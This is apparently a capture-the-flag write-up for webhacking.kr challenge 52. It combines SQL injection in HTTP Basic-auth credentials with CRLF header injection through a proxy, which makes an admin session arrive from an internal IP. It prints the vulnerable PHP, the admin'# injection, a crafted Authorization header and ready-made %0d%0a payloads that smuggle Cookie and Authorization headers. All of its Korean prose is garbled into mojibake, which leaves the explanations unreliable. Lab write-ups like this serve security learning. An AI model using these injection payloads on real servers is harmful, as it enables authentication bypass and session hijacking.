---
title: "[webhacking.kr] 52ë²ˆ ë¬¸ì œ í’€ì´[SSRF,HTTP Header Injection]"
categories:
  - webhacking
tags:
  - webhacking.kr
  - wargame
  - SSRF
  - HTTP Header Injection
toc: true
toc_sticky: true
toc_label: "52ë²ˆ ë¬¸ì œ í’€ì´"
toc_icon: "bookmark"
author_profile: true
---

ğŸ’¡ Webhacking.kr challenge(old) 52ë²ˆ ë¬¸ì œì— ëŒ€í•œ í’€ì´ì…ë‹ˆë‹¤.
{: .notice--warning}

# ë¬¸ì œ
  ![image](https://user-images.githubusercontent.com/33647663/153123990-713c4d8a-3499-4a47-83ea-38dc56ef22d7.png)

  
  **admin page ì†ŒìŠ¤ì½”ë“œ**

  ```php
<?php
include "config.php";
if($_GET['view_source']) view_source();
if($_GET['logout'] == 1){
  $_SESSION['login']="";
  exit("<script>location.href='./';</script>");
}
if($_SESSION['login']){
  echo "hi {$_SESSION['login']}<br>";
  if($_SESSION['login'] == "admin"){
    if(preg_match("/^172\.17\.0\./",$_SERVER['REMOTE_ADDR'])) echo $flag;
    else echo "Only access from virtual IP address";
  }
  else echo "You are not admin";
  echo "<br><a href=./?logout=1>[logout]</a>";
  exit;
}
if(!$_SESSION['login']){
  if(preg_match("/logout=1/",$_SERVER['HTTP_REFERER'])){
    header('WWW-Authenticate: Basic realm="Protected Area"');
    header('HTTP/1.0 401 Unauthorized');
  }
  if($_SERVER['PHP_AUTH_USER']){
    $id = $_SERVER['PHP_AUTH_USER'];
    $pw = $_SERVER['PHP_AUTH_PW'];
    $pw = md5($pw);
    $db = dbconnect();
    $query = "select id from member where id='{$id}' and pw='{$pw}'";
    $result = mysqli_fetch_array(mysqli_query($db,$query));
    if($result['id']){
      $_SESSION['login'] = $result['id'];
      exit("<script>location.href='./';</script>");
    }
  }
  if(!$_SESSION['login']){
    header('WWW-Authenticate: Basic realm="Protected Area"');
    header('HTTP/1.0 401 Unauthorized');
    echo "Login Fail";
  }
}
  ```

  í”„ë¡ì‹œ ì„œë²„ëŠ” page ë³€ìˆ˜ë¡œ ì£¼ì–´ì§„ ê²½ë¡œì˜ ê°’ì„ ì½ì–´ ì™€ì¤ë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/153124065-51a39c03-933f-43bc-b9ce-caeaddda6d48.png)


# PHP_AUTH_USER
  ìš°ì„  í•´ë‹¹ ë¬¸ì œë¥¼ í’€ê¸°ìœ„í•´ì„œëŠ” php_auth_userê°€ ì–´ë–¤ ë°©ì‹ìœ¼ë¡œ ì¸ì¦ì„ ìˆ˜í–‰í•˜ëŠ”ì§€ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤. ì´í•´ë¥¼ ìœ„í•´ì„œ ì˜ˆì‹œ ì½”ë“œë¥¼ ê°€ì ¸ì™”ìŠµë‹ˆë‹¤. ë‹¤ìŒì€ $_SERVER['PHP_AUTH_USER']ë¥¼ ì´ìš©í•˜ì—¬ ì¸ì¦ì„ ìˆ˜í–‰í•˜ëŠ” php ì½”ë“œì…ë‹ˆë‹¤.

  ```php
<?php
if (!isset($_SERVER['PHP_AUTH_USER'])) {
    header('WWW-Authenticate: Basic realm="My Realm"');
    header('HTTP/1.0 401 Unauthorized');
    echo 'ì‚¬ìš©ìê°€ ì·¨ì†Œ ë²„íŠ¼ì„ ëˆŒë €ì„ ë•Œ ì „ì†¡ë˜ëŠ” í…ìŠ¤íŠ¸';
    exit;
} else {
    echo "<p>ì•ˆë…•í•˜ì„¸ìš”, {$_SERVER['PHP_AUTH_USER']}.</p>";
    echo "<p>{$_SERVER['PHP_AUTH_PW']}ë¥¼ íŒ¨ìŠ¤ì›Œë“œë¡œ ì ‘ì†í–ˆìŠµë‹ˆë‹¤.</p>";
}
?>
  ```

  í•´ë‹¹ php í˜ì´ì§€ë¡œ ì ‘ê·¼í•˜ë©´ ì´ˆê¸°ì—ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ë¡œê·¸ì¸ì„ í•˜ë¼ëŠ” ì°½ì´ ë‚˜ì˜µë‹ˆë‹¤.     

  ![image](https://user-images.githubusercontent.com/33647663/153124441-9c62e869-5994-446b-87b4-ac08d69ddb9c.png)

  ì´ë•Œ ì·¨ì†Œ ë²„íŠ¼ì„ ëˆ„ë¥´ë©´, echoì— ì¨ì¤€ ë¶€ë¶„ì´ í™”ë©´ì— ì¶œë ¥ë©ë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/153131590-850f4b6d-7506-403a-9b87-f3cb1b8d7ed7.png)

  ì•„ì´ë””ì™€ ë¹„ë°€ë²ˆí˜¸(guest/guest1234)ë¥¼ ì…ë ¥í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ ì¶œë ¥ì´ ë©ë‹ˆë‹¤. 
  
  ![image](https://user-images.githubusercontent.com/33647663/153131940-c5bbf412-1368-4362-8f48-3fbe7b6ab7bb.png)
  
  ì´ë•Œ íŒ¨í‚· ìƒì—ì„œ **$_SERVER['PHP_AUTH_USER] ì™€ $_SERVER['PHP_AUTH_PW']**ë¥¼ ì–´ë–»ê²Œ ì „ë‹¬í•˜ëŠ”ì§€ í™•ì¸í•´ ë³´ê² ìŠµë‹ˆë‹¤. ë‹¤ìŒì€ ì•„ì´ë””ì™€ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì…ë ¥í•˜ê³  í™•ì¸ì„ ëˆŒë €ì„ ë•Œ, ìš”ì²­í•˜ëŠ” í—¤ë”ë¥¼ ìº¡ì²˜í•œ ê²ƒì…ë‹ˆë‹¤. **Authorization** ì´ë¼ëŠ” í—¤ë”ê°€ ìƒê²¼ê³ , ê·¸ ê°’ìœ¼ë¡œ **Basic Z3Vlc3Q6Z3Vlc3QxMjM0**ì´ ë“¤ì–´ê°€ ìˆìŠµë‹ˆë‹¤. 

  ![image](https://user-images.githubusercontent.com/33647663/153131900-8cb281aa-f0f3-4d72-875d-04d45bc08e8d.png)

  Basic ë’¤ì— ìˆëŠ” ë¶€ë¶„ì€ Base64ë¡œ ì¸ì½”ë”© ëœ ì •ë³´ë¡œ Base64ë¡œ ë””ì½”ë”© í•´ë³´ë©´ ë‹¤ìŒê³¼ ê°™ì€ ë‚˜ì˜µë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/153132387-7095ccc1-0408-42a9-9ebd-8b8d00dde0e7.png)

  ì¦‰ $_SERVER['PHP_AUTH_USER'] ê³¼ $_SERVER['PHP_AUTH_PW']ë¡œ ë¡œê·¸ì¸ì„ í•˜ëŠ” php í˜ì´ì§€ì—ì„œëŠ” í—¤ë”ë¡œ Authorization ì„ ë§Œë“¤ê³  ê°’ìœ¼ë¡œ ```basic base64encode(id:pw)```ë¥¼ í•´ì„œ ë³´ë‚´ë©´ ëœë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. 

 
# ë¬¸ì œ í’€ì´
## SQL Injection
  ìš°ì„  ì´ë²ˆ ë¬¸ì œì—ì„œ sqlë¬¸ì„ ë¨¼ì € ë³´ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.
  ```sql
select id from member where id='{$id}' and pw='{$pw}
  ```
  
  í•„í„°ë§ì´ í•˜ë‚˜ë„ ê±¸ë ¤ìˆì§€ ì•Šê¸° ë•Œë¬¸ì—, ë‹¤ìŒê³¼ ê°™ì´ idë¥¼ ì´ìš©í•´ì„œ sql injection ê³µê²©ì„ í•´ë´…ë‹ˆë‹¤.
  ```md
id = admin'#_   <-_ëŠ” ë§ˆì§€ë§‰ì— ê³µë°±ì„ ì˜ë¯¸  
  ```

  ì„±ê³µì ìœ¼ë¡œ ê³µê²©ì´ ì„±ê³µí•¨ì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. 
  ![image](https://user-images.githubusercontent.com/33647663/153134526-f9b6c238-b655-4755-b14c-4af5470d0e81.png)

  ì§€ê¸ˆì€ ì ‘ì†í•œ ì£¼ì†Œê°€ ì €ì˜ IPì´ê¸° ë•Œë¬¸ì— í’€ë¦¬ì§€ ì•ŠìŠµë‹ˆë‹¤. ì´ì œ ë¬¸ì œì—ì„œ ì£¼ì–´ì§„ proxy ì„œë²„ë¥¼ ì´ìš©í•´ì„œ ì ‘ì†ì„ í•´ë´…ë‹ˆë‹¤.

## HTTP Header Injection
  í”„ë¡ì‹œ ì„œë²„ì—ì„œ ?page=/admin/ ì •ë³´ë¥¼ ì…ë ¥í•˜ë©´ ë‹¤ìŒì²˜ëŸ¼ Request íŒ¨í‚·ì´ ì‘ì„±ë©ë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/153135019-bfa59881-aa40-47da-95ef-8f38b681de0b.png)

  HTTP í—¤ë”ëŠ” %0d%0a(CRLF)ë¥¼ ê¸°ì¤€ìœ¼ë¡œ í—¤ë”ë¥¼ êµ¬ë¶„í•©ë‹ˆë‹¤. ë”°ë¼ì„œ í˜„ì¬ ë¬¸ì œì—ì„œ ë‹¤ìŒê³¼ ê°™ì´ ?page=/admin/%0d%0aë¥¼ ì…ë ¥í•´ì£¼ë©´ í—¤ë”ê°€ ë‚˜ëˆ ì§€ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/153135303-31886dfa-6149-48e1-8be8-f7dadd4b6332.png)

  ì´ì œ ì´ë¥¼ ì´ìš©í•´ì„œ í—¤ë”ë¥¼ ì¶”ê°€ì ìœ¼ë¡œ ì‚½ì… í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **PHP_AUTH** ì •ë³´ë¥¼ í†µê³¼í•´ì•¼ í•˜ë¯€ë¡œ ì´ì „ì— ì„¤ëª…ë“œë ¸ë‹¤ ì‹œí”¼ Authorization í—¤ë”ë¥¼ ì¶”ê°€í•´ ì£¼ê³ , base64ë¡œ **admin'# :1234**ë¥¼ ì¸ì½”ë”© í•œ ê°’ì„ ë„£ì–´ì¤ë‹ˆë‹¤.

  ```
  base64(admin'# :1234) : YWRtaW4nIyA6MTIzNA==
  ```

  ì´ì œ ì´ ì •ë³´ë“¤ì„ ì¡°í•©í•˜ì—¬ ë‹¤ìŒê³¼ ê°™ì´ ë§Œë“¤ì–´ ì¤ë‹ˆë‹¤. ë§ˆì§€ë§‰ HTTP/1.1 ì •ë³´ë¥¼ ì²˜ë¦¬í•´ ì¤˜ì•¼ í•˜ê¸° ë•Œë¬¸ì— ì„œë²„ì—ì„œ ìœ íš¨ì„± ê²€ì¦ì„ í•˜ì§€ ì•ŠëŠ” User-Agentë¥¼ ë§ˆì§€ë§‰ì— ë„£ì–´ì¤˜ì„œ ì˜¤ë¥˜ê°€ ë‚˜ì§€ ì•Šë„ë¡ í•´ì¤¬ìŠµë‹ˆë‹¤.
  ```
?page=/admin/ HTTP/1.1%0d%0aAuthorization: Basic YWRtaW4nIyA6MTIzNA==%0d%0aUser-Agent:
  ```

  ì‹¤í–‰ì„ í•´ë³´ë©´ ë‹¤ìŒì˜ í™”ë©´ì´ ì ê¹ ë‚˜ì™”ë‹¤ê°€ ë°”ë¡œ redirect ë˜ë²„ë¦½ë‹ˆë‹¤. 
  ![image](https://user-images.githubusercontent.com/33647663/153136267-ff05e698-c156-4362-819e-f63f5c30c3e7.png)

  ê·¸ ì´ìœ ëŠ” ë‹¤ì‹œ ë¬¸ì œ ì½”ë“œë¥¼ ë³´ë©´, admin í˜ì´ì§€ëŠ” ë§¨ ì²˜ìŒ ë¡œê·¸ì¸ì´ ì„±ê³µë˜ë©´ location.hrefë¡œ ë‹¤ì‹œ ìš”ì²­ì„ ë³´ë‚´ì„œ ìƒì„±ëœ ì„¸ì…˜ìœ¼ë¡œ ë¡œê·¸ì¸ ê²€ì¦ì„ ë‹¤ì‹œí•´ì•¼ í•©ë‹ˆë‹¤. í•˜ì§€ë§Œ proxyëŠ” ë‹¨ í•œë²ˆì˜ ìš”ì²­ì„ ë³´ë‚´ê³  ì„œë²„ë¡œë¶€í„° ì˜¨ ì‘ë‹µê°’ì— ëŒ€í•œ ì²˜ë¦¬ëŠ” í•´ì£¼ì§€ ì•Šê¸° ë•Œë¬¸ì— í’€ë¦¬ì§€ ì•ŠìŠµë‹ˆë‹¤.

  ```php
if($_SESSION['login']){
  // ì¤‘ëµ,,
}
// ì´ ì•„ë«ë¶€ë¶„ë§Œ ì‹¤í–‰ë¨
if(!$_SESSION['login']){
  if($_SERVER['PHP_AUTH_USER']){
    $id = $_SERVER['PHP_AUTH_USER'];
    $pw = $_SERVER['PHP_AUTH_PW'];
    $pw = md5($pw);
    $db = dbconnect();
    $query = "select id from member where id='{$id}' and pw='{$pw}'";
    $result = mysqli_fetch_array(mysqli_query($db,$query));
    if($result['id']){
      $_SESSION['login'] = $result['id'];
      exit("<script>location.href='./';</script>");
    }
  }
}
  ```

  ë”°ë¼ì„œ ì´ë²ˆì—ëŠ” ìš”ì²­ì‹œì— ì„¸ì…˜ì´ í¬í•¨ë˜ë„ë¡ ì¿¼ë¦¬ë¥¼ ì‘ì„±í•´ì•¼ í•©ë‹ˆë‹¤. ì„¸ì…˜ì— ëŒ€í•œ ì •ë³´ëŠ” ì¿ í‚¤ì˜ PHPSESSIDì— ì €ì¥ë©ë‹ˆë‹¤. ìœ„ì˜ ìº¡ì²˜ëœ í™”ë©´ì„ ë³´ë©´ **Set-Cookie: PHPSESSID= ~**ì´ë ‡ê²Œ ì„¸ì…˜ì„ ë§Œë“¤ì–´ ì¤€ ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ í•´ë‹¹ ì„¸ì…˜ì„ ì´ìš©í•´ì„œ ë‹¤ì‹œ ì¬ìš”ì²­ì„ í•´ë´…ë‹ˆë‹¤.

  ```
/admin/ HTTP/1.1%0d%0aCookie: PHPSESSID=do01jvo450c2j3qteldt46j79l%0d%0aUser-Agent:
  ```

  ![image](https://user-images.githubusercontent.com/33647663/153137826-ca6a78c1-e8dc-482a-b8f2-0d3cb43b6ead.png)


  ì´ë ‡ê²Œ ì´ì „ì— ìƒì„±ëœ ì„¸ì…˜ì„ ì´ìš©í•´ì„œ ì¬ìš”ì²­ì„ ë³´ë‚´ì–´ ë¬¸ì œë¥¼ í’€ ìˆ˜ ìˆìŠµë‹ˆë‹¤.



# ê¹”ë”í•œ í’€ì´
  ë¬¸ì œë¥¼ í’€ê³ ë‚˜ì„œ ë¸”ë¡œê·¸ ì •ë¦¬ë¥¼ í•˜ê¸° ìœ„í•´ì„œ ìƒê°í•´ë³´ë‹ˆê¹Œ ìœ„ì—ì„œ í•œ ë°©ë²•ë³´ë‹¤ í›¨ì”¬ ì‰½ê²Œ í‘¸ëŠ” ë°©ë²•ì´ ìƒê°ë‚˜ì„œ ì •ë¦¬í•´ ë‘¡ë‹ˆë‹¤.

  ìš°ì„  í”„ë¡ì‹œê°€ ì•„ë‹Œ ì›ë˜ í˜ì´ì§€ì—ì„œ SQLI ë¥¼ ì´ìš©í•´ì„œ adminìœ¼ë¡œ ë¡œê·¸ì¸ì„ í•œ ì„¸ì…˜ì„ ìƒì„±í•©ë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/153130134-579f8384-a3b1-4b4a-bcea-261d4b646add.png)

  ![image](https://user-images.githubusercontent.com/33647663/153130163-64cad1d9-33ba-4e28-999e-20be84b59a08.png)

  ì´ì œ ì´ ì„¸ì…˜ì„ ë°”ë¡œ í”„ë¡ì‹œì—ì„œ ì´ìš©í•˜ë©´ ë©ë‹ˆë‹¤. ë¬¸ì œì˜ ì½”ë“œì—ì„œ flagë¥¼ ì–»ê¸°ìœ„í•œ ì§ì ‘ì ì¸ ì½”ë“œë§Œ ë³´ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

  ```php
<?php
if($_SESSION['login']){
  echo "hi {$_SESSION['login']}<br>";
  if($_SESSION['login'] == "admin"){
    if(preg_match("/^172\.17\.0\./",$_SERVER['REMOTE_ADDR'])) echo $flag;
    else echo "Only access from virtual IP address";
  }
  else echo "You are not admin";
  echo "<br><a href=./?logout=1>[logout]</a>";
  exit;
}
  ```

  1. í˜„ì¬ ì„¸ì…˜ì—ì„œ login ê°’ì´ ìˆìœ¼ë©°, í•´ë‹¹ ì„¸ì…˜ì˜ ì €ì¥ëœ ê°’ì´ 'admin'ì´ì–´ì•¼ í•œë‹¤.

  2. ê·¸ë¦¬ê³  í˜„ì¬ ìš”ì²­ì„ ë³´ë‚¸ ì‚¬ì„¤ ip(í”„ë¡ì‹œ ì´ìš©)ì—¬ì•¼ í•œë‹¤.

  ì¦‰ í˜„ì¬ ì„¸ì…˜ì— $_SESSION['login'] = admin ìœ¼ë¡œ ë“¤ì–´ê°€ ìˆê³  í”„ë¡ì‹œë¥¼ í†µí•´ì„œ ì´ ì„¸ì…˜ì„ ì´ìš©í•˜ì—¬ ìš”ì²­ë§Œ í•˜ë©´ ë©ë‹ˆë‹¤.ì´ ì„¸ì…˜ì„ ì´ìš©í•˜ê¸° ìœ„í•´ì„œëŠ” ì¿ í‚¤ì— ë“¤ì–´ê°€ ìˆëŠ” PHPSESSID ê°’ì„ ì´ìš©í•´ ì¤ë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/153130793-7f82cdfb-8251-43fe-8f01-e136ae49db1f.png)

  í”„ë¡ì‹œ ì„œë²„ì—ì„œëŠ” HTTP Header Injectionì„ ë‹¤ìŒê³¼ ê°™ì´ í•´ì£¼ë©´ ë©ë‹ˆë‹¤.
  ```md
/admin/%20HTTP/1.1%0d%0aCookie: PHPSESSID=47986b0fbems9oh0nupk83ek88%0d%0aUser-Agent:
  ```

  ìœ„ì™€ê°™ì´ ìš”ì²­í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ ì„±ê³µì ìœ¼ë¡œ í”Œë˜ê·¸ë¥¼ íšë“í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/153130972-bec03583-d96e-4675-9abe-30898ab1284c.png)
